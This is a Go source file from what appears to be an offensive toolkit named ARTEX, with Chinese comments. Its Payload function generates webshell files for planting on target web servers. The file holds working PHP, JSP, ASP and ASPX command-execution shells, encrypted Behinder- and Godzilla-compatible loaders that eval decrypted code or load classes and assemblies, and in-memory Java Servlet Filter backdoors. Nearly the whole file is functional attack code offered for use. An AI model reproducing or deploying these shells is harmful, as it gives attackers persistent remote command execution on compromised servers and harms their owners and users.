package webshell

import (
	"errors"
	"strings"
)

// Payload 生成与连接协议配套的马文件内容，供 worker 上传或人工落地后连接。
//
// 原生类型按 Target.Param 嵌参数名；第三方类型按 Target.Secret / SecretKey /
// Crypto 嵌入口令与加密方式。冰蝎/哥斯拉马只做「解密请求 + 加载 payload」，命令
// 仍走 ARTEX 的自定义头，因此生成物与连接端始终成对。
func Payload(t *Target) (filename, content string, err error) {
	d, ok := descriptorOf(t.Type)
	if !ok {
		return "", "", ErrUnknownType
	}
	p := t.param()
	switch t.Type {
	case TypePHPEval:
		return d.Filename, "<?php @eval($_POST['" + p + "']);", nil
	case TypePHPAssert:
		return d.Filename, "<?php @assert($_POST['" + p + "']);", nil
	case TypePHPCmd:
		return d.Filename, "<?php system($_REQUEST['" + p + "']);", nil
	case TypeJSP:
		return d.Filename, strings.ReplaceAll(jspShell, "__PARAM__", p), nil
	case TypeASP:
		return d.Filename, strings.ReplaceAll(aspShell, "__PARAM__", p), nil
	case TypeASPX:
		return d.Filename, strings.ReplaceAll(aspxShell, "__PARAM__", p), nil
	case TypeJSPMemory:
		return d.Filename, strings.ReplaceAll(memoryFilter, "__PARAM__", p), nil
	case TypeJSPMemoryHeader:
		return d.Filename, strings.ReplaceAll(memoryHeaderFilter, "__PARAM__", p), nil

	case TypeBehinder3PHP:
		return d.Filename, shellBehinder3PHP(t.secret()), nil
	case TypeBehinder3JSP:
		return d.Filename, shellBehinderJSP(t.secret(), ""), nil
	case TypeBehinder3ASPX:
		return d.Filename, shellBehinder3ASPX(t.secret()), nil
	case TypeBehinder4PHP:
		return d.Filename, shellBehinder4PHP(t.secret(), t.cryptoName()), nil
	case TypeBehinder4JSP:
		return d.Filename, shellBehinderJSP(t.secret(), t.cryptoName()), nil
	case TypeBehinder4ASPX:
		return d.Filename, shellBehinder4ASPX(t.secret()), nil
	case TypeGodzilla4PHP:
		return d.Filename, shellGodzillaPHP(t.secret(), t.secretKey()), nil
	case TypeGodzilla4JSP:
		return d.Filename, shellGodzillaJSP(t.secret(), t.secretKey()), nil
	case TypeGodzilla4ASPX:
		return d.Filename, shellGodzillaASPX(t.secret(), t.secretKey()), nil

	case TypeArtexCryptPHP:
		return d.Filename, shellArtexCryptPHP(t.param(), t.secret()), nil
	case TypeArtexCryptJSP:
		return d.Filename, shellArtexCryptJSP(t.param(), t.secret()), nil
	case TypeArtexCryptASPX:
		return d.Filename, shellArtexCryptASPX(t.param(), t.secret()), nil
	}
	return "", "", errors.New("该类型没有可用的马文件模板")
}

// ---- 冰蝎配套马：解密请求后把明文当代码/类加载 ----
//
// 命令通道仍是 ARTEX 的自定义头，所以生成物只负责「解出请求体」。同一份马也能
// 被官方冰蝎客户端使用，因为对方的 payload 同样是被解密后直接 eval/加载。

func shellBehinder3PHP(secret string) string {
	return `<?php
@error_reporting(0);
$key = "` + key16(secret) + `";
$raw = base64_decode(file_get_contents("php://input"));
$data = openssl_decrypt($raw, "AES-128-CBC", $key, OPENSSL_RAW_DATA, str_repeat("\0", 16));
if ($data === false) { $data = ""; }
$arr = explode("|", $data, 2);
@eval(count($arr) === 2 ? $arr[1] : $data);
`
}

func shellBehinder4PHP(secret, crypto string) string {
	key := key16(secret)
	decode := ""
	switch crypto {
	case CryptoBehinderAESMagic:
		decode = `$data = substr($data, 0, strlen($data) - hexdec(substr($key, 0, 2)) % 16);
$data = openssl_decrypt(base64_decode($data), "AES-128-ECB", $key, OPENSSL_RAW_DATA);`
	case CryptoBehinderXORB64:
		decode = `$data = base64_decode($data);
for ($i = 0; $i < strlen($data); $i++) { $data[$i] = $data[$i] ^ $key[$i + 1 & 15]; }`
	default:
		decode = `$data = openssl_decrypt(base64_decode($data), "AES-128-ECB", $key, OPENSSL_RAW_DATA);`
	}
	return `<?php
@error_reporting(0);
$key = "` + key + `";
$data = file_get_contents("php://input");
` + decode + `
if ($data === false) { $data = ""; }
@eval($data);
`
}

func shellBehinder3ASPX(secret string) string {
	return `<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
static byte[] Dec(byte[] data) {
    string key = "` + key16(secret) + `";
    RijndaelManaged aes = new RijndaelManaged();
    aes.Mode = CipherMode.CBC;
    aes.Key = Encoding.UTF8.GetBytes(key);
    aes.IV = Encoding.UTF8.GetBytes(key);
    aes.Padding = PaddingMode.PKCS7;
    return aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
}
</script>
<%
byte[] body = Request.BinaryRead(Request.ContentLength);
System.Reflection.Assembly asm = System.Reflection.Assembly.Load(Dec(body));
asm.CreateInstance("U").Equals(this);
%>
`
}

func shellBehinder4ASPX(secret string) string {
	return `<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
static byte[] Dec(byte[] data) {
    string key = "` + key16(secret) + `";
    RijndaelManaged aes = new RijndaelManaged();
    aes.Mode = CipherMode.ECB;
    aes.Key = Encoding.UTF8.GetBytes(key);
    aes.Padding = PaddingMode.PKCS7;
    return aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
}
</script>
<%
byte[] body = Request.BinaryRead(Request.ContentLength);
byte[] raw = Convert.FromBase64String(Encoding.UTF8.GetString(body));
System.Reflection.Assembly asm = System.Reflection.Assembly.Load(Dec(raw));
asm.CreateInstance("U").Equals(this);
%>
`
}

func shellBehinderJSP(secret, crypto string) string {
	key := key16(secret)
	var dec string
	switch crypto {
	case CryptoBehinderAESMagic:
		dec = `data = java.util.Arrays.copyOfRange(data, 0, data.length - Integer.parseInt("` + key[:2] + `", 16) % 16);
        data = b64(data);
        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(2, new javax.crypto.spec.SecretKeySpec("` + key + `".getBytes(), "AES"));
        return c.doFinal(data);`
	case CryptoBehinderXOR:
		dec = `byte[] k = "` + key + `".getBytes();
        for (int i = 0; i < data.length; i++) { data[i] = (byte) (data[i] ^ k[i + 1 & 15]); }
        return data;`
	case CryptoBehinderXORB64:
		dec = `data = b64(data);
        byte[] k = "` + key + `".getBytes();
        for (int i = 0; i < data.length; i++) { data[i] = (byte) (data[i] ^ k[i + 1 & 15]); }
        return data;`
	default:
		dec = `data = b64(data);
        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
        c.init(2, new javax.crypto.spec.SecretKeySpec("` + key + `".getBytes(), "AES"));
        return c.doFinal(data);`
	}
	return `<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!
static byte[] b64(byte[] b) throws Exception {
    try {
        Class c = Class.forName("java.util.Base64");
        Object d = c.getMethod("getDecoder").invoke(null);
        return (byte[]) d.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(d, new Object[]{b});
    } catch (Throwable t) {
        Object d = Class.forName("sun.misc.BASE64Decoder").newInstance();
        return (byte[]) d.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(d, new Object[]{new String(b)});
    }
}
static byte[] dec(byte[] data) throws Exception {
    ` + dec + `
}
class U extends ClassLoader { U(ClassLoader p) { super(p); } Class g(byte[] b) { return defineClass(b, 0, b.length); } }
%>
<%
if ("POST".equals(request.getMethod())) {
    java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
    byte[] buf = new byte[2048];
    int n;
    while ((n = request.getInputStream().read(buf)) > 0) { bos.write(buf, 0, n); }
    byte[] payload = dec(bos.toByteArray());
    out.clear();
    out = pageContext.pushBody();
    new U(this.getClass().getClassLoader()).g(payload).newInstance().equals(pageContext);
}
%>
`
}

// ---- 哥斯拉 4 配套马 ----

func shellGodzillaPHP(pass, secretKey string) string {
	key := key16(secretKey)
	return `<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function artex_xor($D, $K) {
    for ($i = 0; $i < strlen($D); $i++) { $D[$i] = $D[$i] ^ $K[$i + 1 & 15]; }
    return $D;
}
$pass = "` + pass + `";
$key = "` + key + `";
if (isset($_POST[$pass])) {
    $data = artex_xor(base64_decode($_POST[$pass]), $key);
    if (isset($_SESSION["payload"])) {
        eval($_SESSION["payload"]);
        echo substr(md5($pass . $key), 0, 16);
        echo base64_encode(artex_xor(@run($data), $key));
        echo substr(md5($pass . $key), 16);
    } else {
        $_SESSION["payload"] = $data;
    }
}
`
}

func shellGodzillaJSP(pass, secretKey string) string {
	key := key16(secretKey)
	return `<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!
String xc = "` + key + `";
String pass = "` + pass + `";
String md5 = md5(pass + xc);
static String md5(String s) {
    try {
        java.security.MessageDigest m = java.security.MessageDigest.getInstance("MD5");
        byte[] b = s.getBytes();
        m.update(b, 0, b.length);
        return new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
    } catch (Exception e) { return ""; }
}
class X extends ClassLoader { X(ClassLoader p) { super(p); } Class Q(byte[] b) { return defineClass(b, 0, b.length); } }
byte[] x(byte[] s, boolean m) {
    try {
        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
        return c.doFinal(s);
    } catch (Exception e) { return null; }
}
static String b64e(byte[] bs) throws Exception {
    try {
        Class c = Class.forName("java.util.Base64");
        Object e = c.getMethod("getEncoder").invoke(null);
        return (String) e.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(e, new Object[]{bs});
    } catch (Throwable t) {
        Object e = Class.forName("sun.misc.BASE64Encoder").newInstance();
        return ((String) e.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(e, new Object[]{bs})).replace("\n", "").replace("\r", "");
    }
}
static byte[] b64d(String bs) throws Exception {
    try {
        Class c = Class.forName("java.util.Base64");
        Object d = c.getMethod("getDecoder").invoke(null);
        return (byte[]) d.getClass().getMethod("decode", new Class[]{String.class}).invoke(d, new Object[]{bs});
    } catch (Throwable t) {
        Object d = Class.forName("sun.misc.BASE64Decoder").newInstance();
        return (byte[]) d.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(d, new Object[]{bs});
    }
}
%>
<%
try {
    byte[] data = b64d(request.getParameter(pass));
    data = x(data, false);
    if (session.getAttribute("payload") == null) {
        session.setAttribute("payload", new X(this.getClass().getClassLoader()).Q(data));
    } else {
        request.setAttribute("parameters", data);
        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
        Object f = ((Class) session.getAttribute("payload")).newInstance();
        f.equals(arrOut);
        f.equals(pageContext);
        response.getWriter().write(md5.substring(0, 16));
        f.toString();
        response.getWriter().write(b64e(x(arrOut.toByteArray(), true)));
        response.getWriter().write(md5.substring(16));
    }
} catch (Exception e) { }
%>
`
}

func shellGodzillaASPX(pass, secretKey string) string {
	key := key16(secretKey)
	return `<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
static string key = "` + key + `";
static string pass = "` + pass + `";
static string Md5(string s) {
    return System.BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(s))).Replace("-", "");
}
static byte[] X(byte[] d, bool enc) {
    RijndaelManaged aes = new RijndaelManaged();
    aes.Mode = CipherMode.CBC;
    aes.Key = Encoding.UTF8.GetBytes(key);
    aes.IV = Encoding.UTF8.GetBytes(key);
    aes.Padding = PaddingMode.PKCS7;
    return enc ? aes.CreateEncryptor().TransformFinalBlock(d, 0, d.Length)
               : aes.CreateDecryptor().TransformFinalBlock(d, 0, d.Length);
}
</script>
<%
try {
    string md5 = Md5(pass + key);
    byte[] data = Convert.FromBase64String(Context.Request[pass]);
    data = X(data, false);
    if (Context.Session["payload"] == null) {
        Context.Session["payload"] = System.Reflection.Assembly.Load(data);
    } else {
        MemoryStream outStream = new MemoryStream();
        object o = ((System.Reflection.Assembly) Context.Session["payload"]).CreateInstance("LY");
        o.Equals(outStream);
        o.Equals(Context);
        o.Equals(data);
        o.ToString();
        byte[] r = outStream.ToArray();
        Context.Response.Write(md5.Substring(0, 16));
        Context.Response.Write(Convert.ToBase64String(X(r, true)));
        Context.Response.Write(md5.Substring(16));
    }
} catch (Exception) { }
%>
`
}

// memoryFilter / memoryHeaderFilter 是内存马的连接端实现：一个按 ARTEX 协议回命令的
// Servlet Filter。与文件型马的区别只在「谁收命令」——参数或自定义头。
//
// 这里只给 Filter 本体：把它注册进目标进程的方式（web.xml、Spring
// FilterRegistrationBean、或既有注入器）由使用者按目标框架决定，注册进去即可连。
// javax.* 命名空间对应 Tomcat 8/9 一类 Servlet 4 以下容器；Tomcat 10+ 需把 import
// 换成 jakarta.servlet.*。
const memoryFilter = `import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;
import java.util.Base64;

/** ARTEX 内存马连接端（参数触发）：POST 参数 __PARAM__ 携带 base64(边界\n边界\n命令)。 */
public class ArtexFilter implements Filter {
    public void init(FilterConfig cfg) {}
    public void destroy() {}

    public void doFilter(ServletRequest rq, ServletResponse rs, FilterChain chain)
            throws IOException, ServletException {
        String enc = ((HttpServletRequest) rq).getParameter("__PARAM__");
        if (enc == null) { chain.doFilter(rq, rs); return; }
        PrintWriter out = rs.getWriter();
        try {
            String d = new String(Base64.getDecoder().decode(enc), "UTF-8");
            int i1 = d.indexOf('\n'), i2 = d.indexOf('\n', i1 + 1);
            if (i1 < 0 || i2 <= i1) { out.print("bad payload"); return; }
            String b = d.substring(0, i1), e = d.substring(i1 + 1, i2), c = d.substring(i2 + 1);
            boolean win = System.getProperty("os.name").toLowerCase().indexOf("win") >= 0;
            String[] argv = win ? new String[]{"cmd.exe", "/c", c + " 2>&1"}
                                : new String[]{"/bin/sh", "-c", c + " 2>&1"};
            Process pr = Runtime.getRuntime().exec(argv);
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            InputStream in = pr.getInputStream();
            byte[] buf = new byte[4096]; int n;
            while ((n = in.read(buf)) > 0) { bo.write(buf, 0, n); }
            pr.waitFor();
            out.print(b + new String(bo.toByteArray(), "UTF-8") + e);
        } catch (Exception ex) { out.print("err: " + ex); }
    }
}
`

const memoryHeaderFilter = `import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;
import java.util.Base64;

/** ARTEX 内存马连接端（请求头触发）：头 __PARAM__ 携带 base64(边界\n边界\n命令)，GET 即可。 */
public class ArtexFilter implements Filter {
    public void init(FilterConfig cfg) {}
    public void destroy() {}

    public void doFilter(ServletRequest rq, ServletResponse rs, FilterChain chain)
            throws IOException, ServletException {
        String enc = ((HttpServletRequest) rq).getHeader("__PARAM__");
        if (enc == null) { chain.doFilter(rq, rs); return; }
        PrintWriter out = rs.getWriter();
        try {
            String d = new String(Base64.getDecoder().decode(enc), "UTF-8");
            int i1 = d.indexOf('\n'), i2 = d.indexOf('\n', i1 + 1);
            if (i1 < 0 || i2 <= i1) { out.print("bad payload"); return; }
            String b = d.substring(0, i1), e = d.substring(i1 + 1, i2), c = d.substring(i2 + 1);
            boolean win = System.getProperty("os.name").toLowerCase().indexOf("win") >= 0;
            String[] argv = win ? new String[]{"cmd.exe", "/c", c + " 2>&1"}
                                : new String[]{"/bin/sh", "-c", c + " 2>&1"};
            Process pr = Runtime.getRuntime().exec(argv);
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            InputStream in = pr.getInputStream();
            byte[] buf = new byte[4096]; int n;
            while ((n = in.read(buf)) > 0) { bo.write(buf, 0, n); }
            pr.waitFor();
            out.print(b + new String(bo.toByteArray(), "UTF-8") + e);
        } catch (Exception ex) { out.print("err: " + ex); }
    }
}
`

// jspShell 自行按 os.name 选 cmd.exe / /bin/sh，所以同一匹马两头都能用。
// 参数是 base64(begin \n end \n command)，解码后按第一个换行切边界。
const jspShell = `<%@page import="java.io.*"%><%@page import="java.util.*"%><%
String enc=request.getParameter("__PARAM__");
if(enc==null){out.print("no param");return;}
String d=new String(Base64.getDecoder().decode(enc),"UTF-8");
int i1=d.indexOf('\n');int i2=d.indexOf('\n',i1+1);
if(i1<0||i2<i1){out.print("bad payload");return;}
String b=d.substring(0,i1),e=d.substring(i1+1,i2),c=d.substring(i2+1);
boolean win=System.getProperty("os.name").toLowerCase().indexOf("win")>=0;
String[] argv=win?new String[]{"cmd.exe","/c",c+" 2>&1"}:new String[]{"/bin/sh","-c",c+" 2>&1"};
Process pr=Runtime.getRuntime().exec(argv);
ByteArrayOutputStream bo=new ByteArrayOutputStream();
InputStream in=pr.getInputStream();
byte[] buf=new byte[4096];int n;
while((n=in.read(buf))>0){bo.write(buf,0,n);}
pr.waitFor();
out.print(b);out.print(new String(bo.toByteArray(),"UTF-8"));out.print(e);
%>
`

// aspShell 走 WScript.Shell.Exec，输出与错误一并回读。
const aspShell = `<%
Dim b,e,c,w,x,o
b=Request.Form("b"):e=Request.Form("e"):c=Request.Form("__PARAM__")
Set w=CreateObject("WScript.Shell")
Set x=w.Exec("%ComSpec% /c " & c)
Do While x.Status=0
If Not x.StdOut.AtEndOfStream Then o=o & x.StdOut.ReadAll()
If Not x.StdErr.AtEndOfStream Then o=o & x.StdErr.ReadAll()
Loop
If Not x.StdOut.AtEndOfStream Then o=o & x.StdOut.ReadAll()
If Not x.StdErr.AtEndOfStream Then o=o & x.StdErr.ReadAll()
Response.Write b & o & e
%>
`

const aspxShell = `<%@ Page Language="C#" %><script runat="server">
protected void Page_Load(object sender,EventArgs a){
string enc=Request.Form["__PARAM__"];
if(string.IsNullOrEmpty(enc)){Response.Write("no param");return;}
string d=System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(enc));
string[] p=d.Split('\n');
if(p.Length<3){Response.Write("bad payload");return;}
System.Diagnostics.ProcessStartInfo psi=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+p[2]+" 2>&1");
psi.RedirectStandardOutput=true;psi.UseShellExecute=false;
System.Diagnostics.Process pr=System.Diagnostics.Process.Start(psi);
string o=pr.StandardOutput.ReadToEnd();pr.WaitForExit();
Response.Write(p[0]+o+p[1]);
}
</script>
`
